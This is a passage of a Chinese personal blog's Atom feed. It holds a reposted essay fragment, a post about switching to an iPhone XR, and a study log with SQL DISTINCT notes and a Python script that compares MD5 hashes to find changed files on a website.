大家都会明白的，无法跟喜欢的人在一起，其实是人生的常态。</p><p>人生天地间，忽如远行客，爱一直都是这个世界上最美好的事，只有体会到种种爱而不得的心情，才会用为爱痴狂的心去爱世间万物。</p><p>你也要相信，还会有一个人，他将在往后的岁月中，给你更长久幸福，虽然他不曾来过你的青春</p><p>作者：衷曲无闻<br>來源：<a href="https://www.jianshu.com/p/22c5b6081eac">简书</a></p><h1 id="emmm"><a href="#emmm" class="headerlink" title="emmm"></a>emmm</h1><p>转载素锦，个人特别喜欢的一个网站！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;更换托管平台，转载一篇文章&lt;/p&gt;</summary>
    
    
    
    <category term="每日学习小结" scheme="http://example.com/categories/%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/"/>
    
    
    <category term="转载文章" scheme="http://example.com/tags/%E8%BD%AC%E8%BD%BD%E6%96%87%E7%AB%A0/"/>
    
  </entry>
  
  <entry>
    <title>xr上手</title>
    <link href="http://example.com/2020/03/09/xr%E4%B8%8A%E6%89%8B/"/>
    <id>http://example.com/2020/03/09/xr%E4%B8%8A%E6%89%8B/</id>
    <published>2020-03-09T10:49:57.000Z</published>
    <updated>2020-03-09T11:01:39.032Z</updated>
    
    <content type="html"><![CDATA[<p>『垃圾佬』重回ios</p><span id="more"></span><h1 id="XR体验"><a href="#XR体验" class="headerlink" title="XR体验"></a>XR体验</h1><p>在酷安混迹这么久，发现大家也都跟我一样，一直在ios和安卓两大平台切换使用。没错，现在的我也重新回到了ios的怀抱。</p><p>从iPhone X打开了异形屏的时候，五花八门的屏幕就来了。起初我也对此嗤之以鼻，换上了魅族16s，也越来越不喜欢异形屏，但是古话说的好：人总是会变的嘛，对吧，哈哈哈。</p><p>体验了大半天时间，我只想说异形屏真香！很舒服，重新回到了ios的线性动画，那是真的舒服！</p><h1 id="最近的实习工作"><a href="#最近的实习工作" class="headerlink" title="最近的实习工作"></a>最近的实习工作</h1><p>说起实习这个事吧，真的对最近的工作很厌倦。客户那边总是有新的需求，有时候上一个需求刚弄好，就有了下一个需求，哎，不提了，悲伤。。。</p><h1 id="随笔"><a href="#随笔" class="headerlink" title="随笔"></a>随笔</h1><p>但现在我也不知道自己处于一个什么状态，自己也好、这个博客也好，表达出来的东西总是不尽人意。</p><p>我只希望这里能够记录我的一小部分生活，以后回想起来看看也挺有意思的不是吗，当然这只是对我自己。</p><p>短时间我也想不出我的博客的主要内容，暂时就先记录着吧。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;『垃圾佬』重回ios&lt;/p&gt;</summary>
    
    
    
    <category term="搞机佬的快乐" scheme="http://example.com/categories/%E6%90%9E%E6%9C%BA%E4%BD%AC%E7%9A%84%E5%BF%AB%E4%B9%90/"/>
    
    
    <category term="随笔" scheme="http://example.com/tags/%E9%9A%8F%E7%AC%94/"/>
    
    <category term="苹果" scheme="http://example.com/tags/%E8%8B%B9%E6%9E%9C/"/>
    
  </entry>
  
  <entry>
    <title>3-9</title>
    <link href="http://example.com/2020/03/09/3.9/"/>
    <id>http://example.com/2020/03/09/3.9/</id>
    <published>2020-03-09T08:15:57.000Z</published>
    <updated>2020-03-19T10:14:07.871Z</updated>
    
    <content type="html"><![CDATA[<p>学习</p><span id="more"></span><h1 id="今天的学习"><a href="#今天的学习" class="headerlink" title="今天的学习"></a>今天的学习</h1><p>不出意外是看全息流量</p><p>emmmm</p><p>结果继续处理邮箱</p><p>统计邮箱后缀</p><p>@后面那一串</p><p>然后数据量太大，不能直接excel删除重复项</p><p>只能一个一个剔除，卑微</p><p>下午看了一会全息，又tm弄日志了。。。</p><p>关于distinct去重的</p><p>网上的</p><blockquote><p><a href="https://www.cnblogs.com/rainman/archive/2013/05/03/3058451.html">https://www.cnblogs.com/rainman/archive/2013/05/03/3058451.html</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">SQL中distinct的用法</span><br><span class="line">1.作用于单列</span><br><span class="line">2.作用于多列</span><br><span class="line">3.COUNT统计</span><br><span class="line">4.distinct必须放在开头</span><br><span class="line">5.其他</span><br><span class="line">在表中，可能会包含重复值。这并不成问题，不过，有时您也许希望仅仅列出不同（distinct）的值。关键词 distinct用于返回唯一不同的值。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1.作用于单列</span><br><span class="line">select distinct name from A</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.作用于多列</span><br><span class="line">select distinct name, id from A</span><br><span class="line"></span><br><span class="line">实际上是根据name和id两个字段来去重的，这种方式Access和SQL Server同时支持。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select distinct xing, ming from B</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">返回的结果为两行，这说明distinct并非是对xing和ming两列“字符串拼接”后再去重的，而是分别作用于了xing和ming列。</span><br><span class="line"></span><br><span class="line">3.COUNT统计</span><br><span class="line"></span><br><span class="line">select count(distinct name) from A;  --表中name去重后的数目， SQL Server支持，而Access不支持</span><br><span class="line">count是不能统计多个字段的，下面的SQL在SQL Server和Access中都无法运行。</span><br><span class="line"></span><br><span class="line">select count(distinct name, id) from A;</span><br><span class="line">若想使用，请使用嵌套查询，如下：</span><br><span class="line"></span><br><span class="line">select count(*) from (select distinct xing, name from B) AS M;</span><br><span class="line">4.distinct必须放在开头</span><br><span class="line"></span><br><span class="line">select id, distinct name from A;   --会提示错误，因为distinct必须放在开头</span><br><span class="line">5.其他</span><br><span class="line"></span><br><span class="line">distinct语句中select显示的字段只能是distinct指定的字段，其他字段是不可能出现的。例如，假如表A有“备注”列，如果想获取distinc name，以及对应的“备注”字段，想直接通过distinct是不可能实现的。但可以通过其他方法实现关于SQL Server将一列的多行内容拼接成一行的问题讨论</span><br></pre></td></tr></table></figure><h1 id="毕业设计相关"><a href="#毕业设计相关" class="headerlink" title="毕业设计相关"></a>毕业设计相关</h1><p>原文链接</p><blockquote><p><a href="https://www.xp.cn/c.php/78685.html">https://www.xp.cn/c.php/78685.html</a></p></blockquote><p>Python：求代码精简“找出变动的文件的脚本”<br>自己的网站被入侵了，担心被挂马，所以就想写个脚本检查下（虽然有强大的第三方工具），以便进一步提升自己的编程能力。</p><p>思路:需要有一个备份的网站和一个要检测的网站，将2份网站的文件进行文件MD5值比对，从而找出变动的文件<br>代码写得很糙，而自己能力有限，所以就想向的高手们学习下，帮忙指点下，看有哪些地方可以进行改进的</p><p>Python脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">__author__ = &#x27;Flying&#x27;</span><br><span class="line">#coding:utf-8</span><br><span class="line">#批量检测改动的文件</span><br><span class="line">import os,sys,hashlib,datetime</span><br><span class="line">global_DirOld = &quot;&quot;</span><br><span class="line">global_DirNew = &quot;&quot;</span><br><span class="line">global_FilesList = []</span><br><span class="line"></span><br><span class="line">#输入要比对的文件路径</span><br><span class="line">def InputDirPath():</span><br><span class="line">    global global_DirOld,global_DirNew</span><br><span class="line">    global_DirOld = unicode(raw_input(u&quot;请输入备份文件所在目录：&quot;),&quot;utf-8&quot;)</span><br><span class="line">    while not os.path.exists(global_DirOld):</span><br><span class="line">        print  u&quot;指定的路径不存在，请重新输入&quot;</span><br><span class="line">        global_DirOld = unicode(raw_input(u&quot;请输入备份文件所在目录：&quot;),&quot;utf-8&quot;)</span><br><span class="line">    global_DirNew = unicode(raw_input(u&quot;请输入要检测文件的目录：&quot;),&quot;utf-8&quot;)</span><br><span class="line">    while not os.path.exists(global_DirNew):</span><br><span class="line">        print  u&quot;指定的路径不存在，请重新输入&quot;</span><br><span class="line">        global_DirNew = unicode(raw_input(u&quot;请输入要检测文件的目录：&quot;),&quot;utf-8&quot;)</span><br><span class="line"></span><br><span class="line">#将数据保存到文件中</span><br><span class="line">def SaveToFile(filePath,content):</span><br><span class="line">    try:</span><br><span class="line">        f = open(filePath,&quot;a+&quot;)</span><br><span class="line">        f.write(content.encode(&quot;utf-8&quot;) + &quot;\n&quot;)</span><br><span class="line">        f.close()</span><br><span class="line">    except Exception,ex:</span><br><span class="line">        print &quot;Error:&quot; + str(ex)</span><br><span class="line"></span><br><span class="line">#计算文件的MD5值</span><br><span class="line">def CalcMD5(filepath):</span><br><span class="line">    try:</span><br><span class="line">        #以二进制的形式打开</span><br><span class="line">        with open(filepath,&#x27;rb&#x27;) as f:</span><br><span class="line">            md5obj = hashlib.md5()</span><br><span class="line">            md5obj.update(f.read())</span><br><span class="line">            hash = md5obj.hexdigest()</span><br><span class="line">            return hash</span><br><span class="line">    except Exception,ex:</span><br><span class="line">        print &quot;Error:&quot; + str(ex)</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">#遍历目录下的所有文件</span><br><span class="line">def GetAllSubFiles():</span><br><span class="line">    global global_FilesList</span><br><span class="line">    for dir in os.walk(global_DirNew):</span><br><span class="line">        for file in dir[2]:</span><br><span class="line">            filePath = dir[0] + os.sep + file</span><br><span class="line">            global_FilesList.append(filePath[len(global_DirNew)+1:])</span><br><span class="line"></span><br><span class="line">#列出新增文件和变动的文件</span><br><span class="line">def ListChangedFiles():</span><br><span class="line">    global global_DirOld,global_DirNew,global_FilesList</span><br><span class="line">    print &quot;变动或新增的文件：&quot;</span><br><span class="line">    for file in global_FilesList:</span><br><span class="line">        filePathOld = global_DirOld + os.sep + file</span><br><span class="line">        filePathNew = global_DirNew + os.sep + file</span><br><span class="line">        if not os.path.exists(filePathOld) or CalcMD5(filePathOld)!=CalcMD5(filePathNew):</span><br><span class="line">            content = &quot;[&quot; + datetime.datetime.now().strftime(&#x27;%Y-%m-%d %H:%M:%S&#x27;)+ &quot;]&quot; + filePathNew</span><br><span class="line">            print content</span><br><span class="line">            SaveToFile(&quot;ChangedFiles.txt&quot;,content)</span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    InputDirPath()</span><br><span class="line">    GetAllSubFiles()</span><br><span class="line">    ListChangedFiles()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;学习&lt;/p&gt;</summary>
    
    
    
    <category term="每日学习小结" scheme="http://example.com/categories/%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/"/>
    
    
    <category term="python" scheme="http://example.com/tags/python/"/>
    
    <category term="数据库" scheme="http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    <category term="毕业设计" scheme="http://example.com/tags/%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1/"/>
    
  </entry>
  
</feed>
